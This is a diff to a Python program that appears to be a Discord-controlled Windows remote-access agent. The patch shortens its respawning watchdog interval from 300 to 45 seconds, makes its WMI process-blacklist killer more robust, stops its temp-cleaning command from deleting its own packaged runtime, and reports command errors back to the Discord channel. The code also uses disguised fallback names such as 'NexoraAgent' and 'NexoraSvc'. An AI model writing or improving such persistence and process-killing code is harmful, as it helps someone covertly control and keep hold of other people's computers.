@@ -83,8 +83,14 @@ def _crash_exc(t, v, tb):
 
 sys.excepthook = _crash_exc
 
+_FAULT_PATH = os.path.join(CRASH_DIR, "fault.log")
 try:
-    _FAULT_HANDLE = open(os.path.join(CRASH_DIR, "fault.log"), "a", encoding="utf-8")
+    if os.path.exists(_FAULT_PATH) and os.path.getsize(_FAULT_PATH) > 2 * 1024 * 1024:
+        os.replace(_FAULT_PATH, _FAULT_PATH + ".old")
+except Exception:
+    pass
+try:
+    _FAULT_HANDLE = open(_FAULT_PATH, "a", encoding="utf-8")
     faulthandler.enable(_FAULT_HANDLE)
 except Exception:
     _FAULT_HANDLE = None
@@ -105,6 +111,7 @@ except Exception:
     except Exception:
         pass
 import win32com.client
+import pythoncom
 from discord.ext import commands
 import ctypes
 import nacl.secret
@@ -595,7 +602,7 @@ _LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")
 
 REPAIR_FLAG = "--zz-repair"
 STATE_VERSION = 3
-WATCHDOG_PERIOD = 300
+WATCHDOG_PERIOD = 45
 
 _FALLBACK_NAMES = (
     "NexoraAgent", "NexoraSvc", "NexoraHelper", "NexoraCore", "NexoraHost",
@@ -1082,6 +1089,8 @@ def _spawn_watchdog():
     if not slots:
         return
     if _watch_proc is not None and _watch_proc.poll() is None:
+        return
+    if _watch_alive(st.get("mutex")):
         return
     bat = next((s["bat"] for s in slots if os.path.exists(s["bat"])), None)
     if not bat and not _write_watchdog(st):
@@ -1637,6 +1646,7 @@ def _bl_wmi_loop():
             ev = watcher.NextEvent(1500)
         except Exception:
             _bl_sweep()
+            time.sleep(0.25)
             continue
         if bl_has(ev.ProcessName):
             try:
@@ -1646,13 +1656,20 @@ def _bl_wmi_loop():
 
 
 def blacklist_watcher():
+    pythoncom.CoInitialize()
     bl_load()
-    while True:
+    try:
+        while True:
+            try:
+                _bl_wmi_loop()
+            except Exception:
+                _bl_sweep()
+                time.sleep(1.0)
+    finally:
         try:
-            _bl_wmi_loop()
+            pythoncom.CoUninitialize()
         except Exception:
-            _bl_sweep()
-            time.sleep(0.4)
+            pass
 
 
 def get_idle_time():
@@ -4580,11 +4597,15 @@ async def volume_step(ctx, direction: str = "up", times: int = 5):
 @bot.command(aliases=["empty-temp", "clean-temp"])
 async def empty_temp(ctx):
     removed = failed = 0
+    meipass = os.path.abspath(getattr(sys, "_MEIPASS", "") or "")
+    runtime = os.path.dirname(meipass) if meipass else ""
     for root in {tempfile.gettempdir(), os.path.join(WINDIR, "Temp")}:
         if not os.path.isdir(root):
             continue
         for entry in os.listdir(root):
             p = os.path.join(root, entry)
+            if meipass and os.path.abspath(p) in (meipass, runtime):
+                continue
             try:
                 shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
                 removed += 1
@@ -6424,6 +6445,17 @@ async def on_ready():
             threading.Thread(target=fn, daemon=True).start()
         except Exception:
             _crash("ready", "thread {} failed".format(fn.__name__))
+
+@bot.event
+async def on_command_error(ctx, error):
+    _crash("command", "{} -> {!r}\n{}".format(
+        ctx.command, error,
+        "".join(traceback.format_exception(type(error), error, error.__traceback__))))
+    try:
+        await ctx.send(embed=create_embed(
+            "Error", "`{}`: {}".format(ctx.command, error)[:1900], 0xFF0000))
+    except Exception:
+        pass
 
 @bot.event
 async def on_message(message):
